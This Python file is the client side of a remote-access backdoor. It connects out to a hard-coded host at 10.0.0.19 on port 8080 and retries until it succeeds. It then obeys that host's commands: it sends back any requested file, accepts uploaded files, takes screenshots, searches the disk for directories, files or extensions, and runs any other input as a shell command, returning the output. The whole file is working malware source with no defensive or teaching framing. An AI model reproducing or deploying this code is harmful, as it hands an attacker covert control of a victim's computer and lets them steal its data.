import os
import random
import socket
import subprocess
from threading import Thread
from helper_methods import *


class Client(Thread):
    def __init__(self, IP: str, Port: int):
        self.conn = socket.socket()
        self.IP = IP
        self.Port = Port
        print(f"Trying to connect to {self.IP} in port {self.Port}")
        while True:
            try:
                self.conn.connect((IP, Port))
                break
            except Exception:
                sleep_for = random.randrange(1, 10)
                time.sleep(sleep_for)
                continue
        self.conn.send(os.getcwd().encode('ISO-8859-1', errors='ignore'))

    def transfer(self, path):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                self.conn.send(packet)
                packet = f.read(1024)
            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
        else:
            self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))

    def download(self, command):
        f = open(command, 'wb')
        while True:
            bits = self.conn.recv(1024)
            if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
                f.write(bits[:-4])
                f.close()
                print('[+] Transfer completed ')
                break
            if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
                print('[-] Unable to find the file')
                break
            f.write(bits)

    def run(self):
        while True:
            try:
                command = self.conn.recv(1024)
            except ConnectionResetError:
                self.__init__(self.IP, self.Port)
                continue
            if 'terminate' in command.decode('ISO-8859-1', errors='ignore'):
                self.conn.close()
                break
            elif 'cd' in command.decode('ISO-8859-1', errors='ignore'):
                command, path = command.decode('ISO-8859-1', errors='ignore')[0], list_to_path(
                    command.decode('ISO-8859-1', errors='ignore').split(' ')[1:])
                try:
                    os.chdir(path)
                    self.conn.send(f'[+] CWD is {os.getcwd()}'.encode('ISO-8859-1', errors='ignore'))
                except Exception as e:
                    self.conn.send(('[-]' + str(e)).encode('ISO-8859-1', errors='ignore'))
                    print("Could not enter this path.")
            elif 'grab' in command.decode('ISO-8859-1', errors='ignore') or 'download' in command.decode('ISO-8859-1', errors='ignore'):
                grab, path = command.decode().split("*")
                try:
                    self.transfer(path)
                except Exception:
                    pass
            elif 'upload' in command.decode('ISO-8859-1', errors='ignore') or 'send' in command.decode('ISO-8859-1', errors='ignore'):
                send, path = command.decode('ISO-8859-1', errors='ignore').split("*")
                self.download(path)
            elif 'screenshot' in command.decode('ISO-8859-1', errors='ignore'):
                path = screenshot()
                try:
                    self.transfer(path)
                except Exception as e:
                    print(e)
                    raise
            elif 'searchd' in command.decode('ISO-8859-1', errors='ignore'):
                path = command.decode()[8:]
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for name in dir_name:
                        lists += '\n' + os.path.abspath(name)
                print(lists)
                if lists == '':
                    lists = 'No directories were found in the given path.'
                length = len(lists)
                self.conn.send(str(length).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(lists.encode('ISO-8859-1', errors='ignore'))
            elif 'searchf' in command.decode('ISO-8859-1'):
                command = command.decode()[8:]
                path, file_name = command.split('*')  # searchf c:/*abc.pdf -> ['c:/', 'abc.pdf']
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for file in file_names:
                        if file == file_name:
                            lists = '\n' + os.path.abspath(file)
                print(lists)
                if lists == '':
                    lists = 'No match was found in the given path.'
                length = len(lists)
                self.conn.send(str(length).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(lists.encode('ISO-8859-1', errors='ignore'))
            elif 'search' in command.decode('ISO-8859-1', errors='ignore'):
                command = command.decode()[7:]
                path, ext = command.split('*')  # search c:/ *.pdf -> ['c:/', '.pdf']
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for file in file_names:
                        if file.endswith(ext):
                            lists += '\n' + os.path.join(dir_path, file)
                print(lists)
                if lists == '':
                    lists = 'No match was found in the given path.'
                length = len(lists)
                self.conn.send(str(length).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(lists.encode('ISO-8859-1', errors='ignore'))
            else:
                try:
                    output = subprocess.check_output(command.decode('ISO-8859-1', errors='ignore'), timeout=3, shell=True)
                    self.conn.send(str(len(output)).encode('ISO-8859-1', errors='ignore'))
                    self.conn.send(output)
                except Exception as e:
                    print(e)
                    CMD = subprocess.Popen(command.decode('ISO-8859-1'), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           )
                    self.conn.send(str(len(CMD.stdout.read())).encode('ISO-8859-1', errors='ignore'))
                    self.conn.send(CMD.stdout.read())
                    self.conn.send(str(len(CMD.stderr.read())).encode('ISO-8859-1', errors='ignore'))
                    self.conn.send(CMD.stderr.read())


def main():
    client = Client("10.0.0.19", 8080)
    client.run()


main()
